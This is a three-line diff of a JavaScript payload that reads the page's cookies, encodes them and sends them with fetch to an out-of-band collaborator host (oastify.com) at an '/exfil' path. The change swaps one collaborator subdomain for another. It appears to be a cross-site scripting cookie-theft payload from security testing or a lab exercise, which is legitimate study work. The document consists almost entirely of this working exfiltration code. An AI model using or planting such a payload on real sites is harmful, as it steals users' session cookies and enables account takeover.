@@ -1,3 +1,3 @@
 let cookie = document.cookie
 let encodedCookie = encodeURIComponent(cookie)
-fetch("https://ra5ckmibs18p35les05onli6qxwokg85.oastify.com/exfil?data=" + encodedCookie)
+fetch("https://536qd0bplf13wjesley2gzbkjbp2dy1n.oastify.com/exfil?data=" + encodedCookie)
